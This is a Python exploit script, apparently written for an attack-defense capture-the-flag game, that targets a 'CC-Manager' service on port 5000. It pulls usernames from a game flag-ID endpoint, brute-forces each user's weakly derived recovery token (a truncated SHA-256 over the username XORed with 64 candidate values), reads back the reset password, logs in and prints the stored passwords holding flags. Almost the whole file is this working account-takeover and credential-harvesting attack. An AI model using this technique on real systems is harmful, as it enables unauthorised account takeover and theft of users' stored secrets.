#!/usr/bin/env python3
import random
import sys
import requests
import re
import string
import os, math, base64
from Crypto.Cipher import DES
import json
from Crypto.Util.number import inverse, long_to_bytes, bytes_to_long
import pwn, time
from hashlib import sha256, sha1
from Crypto.Util.number import getPrime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Util.number import inverse
import random


rflag = re.compile(r"[A-Z0-9]{31}=")

host = sys.argv[1]

flags = requests.get("http://10.10.0.1:8081/flagIds").json()
CCM = flags["CC-Manager"]
ids = CCM[host]
sigma = string.ascii_lowercase + string.ascii_uppercase + string.digits

creds = []

print(ids)
users = []
for e in ids:
    ee = json.loads(e)
    #print(ee["username"])
    users.append(ee["username"])

pw = 2

def Read(t):
    #print("===== from server =====\n")
    while(t):
        bf = pw.recvline()#timeout=1
        #print(bf)
        t -= 1
    #print("===== ~~~~~~~~~~~ =====\n")

def Read2(t):
    print("===== from server =====\n")
    while(t):
        bf = pw.recvline()#timeout=1
        print(bf)
        t -= 1
    print("===== ~~~~~~~~~~~ =====\n")
        
def Input():
    bf = pw.recvline()
    #bf = bf.decode().split(" ")[-1]
    #print("~ Got Input :", bf)
    return bf

def Pass():
    global pw
    bad_happend = Input()
    if(bad_happend[:4] == b"Some"):
        print("I'm here")
        pw = pwn.remote(host, 5000)
        Read(20)
        return login_try(username, recovery_token)

def login_try(username, recovery_token):
    global pw
    Read(5)
    pw.sendline(b'3')
    pw.sendline(username.encode())
    pw.sendline(recovery_token.encode())
    Read(1)
    nw = Input()
    Read(1)
    if(nw[-7:] == b"wrong!\n"):
        return
    pssw = nw.decode().split(" ")[-1]
    Read(5)
    pw.sendline(b'2')
    pw.sendline(username.encode())
    pw.sendline(pssw.encode())

    '''
    bad_happend = Input()
    print(bad_happend)
    if(bad_happend[:4] == b"Some"):
        print("I'm here")
        pw = pwn.remote(host, 5000)
        Read(20)
        return login_try(username, recovery_token)
    '''

    Read(1)
    is_in = Input()
    Read(1)
    if(is_in[-7:] == b"wrong!\n"):
        print("WTF")
        return

    #print(f"{username} log-in done")
    #print(pssw)
    #exit(0)
    #pw.close()

    creds.append((username, pssw.strip()))

    #rem.sendline(b"2")

    
#    Read2(9)
#
#    
#   # pw.sendline(b'0')
#
#    Read2(1)
#    exit(0)
#    
#    '''
#    print(bad_happend)
#    if(bad_happend[:4] == b"Some"):
#        print("I'm here")
#        pw = pwn.remote(host, 5000)
#        Read(20)
#        return login_try(username, recovery_token)
#    '''
#
#    Read2(3)
#    '''
#    res = Input()
#    Read2(1)
#    print("!@#!")
#    '''
#    return res
    

def run(username):
    
    username_int = int.from_bytes(username.encode(), byteorder = "big")

    global pw
    pw = pwn.remote(host, 5000)
    Read(20)
    
    for rem in range(2**6):
        base_value = (rem << 250)
        assert (base_value == (base_value & ((1 << 256) - 1)))
        recovery_token_int = base_value ^ username_int
        recovery_token = sha256(recovery_token_int.to_bytes(32, byteorder = "big")).hexdigest()[:16]
        

       # res = login_try(username, recovery_token)
       # print(res)
        
    
        try:
            login_try(username, recovery_token)
#            if(res != None):
#                print(res)
        except:
            pw = pwn.remote(host, 5000)
            Read(20)
            pass
        
        '''
        flags = rflag.findall(res)
        if(len(flags) > 0):
            print(flags, flush=True)
        '''
        #break

for user in users:
    run(user)
    #break

print(creds)

for cred in creds:
    rem = pwn.remote(host, 5000)

    rem.sendline(b"2")
    rem.sendline(cred[0].encode())
    rem.sendline(cred[1].encode())

    rem.sendline(b"2")
    rem.recvuntil(b"passwords:")
    rem.recvline()
    print(rem.recvline(), flush=True)

    #rem.interactive()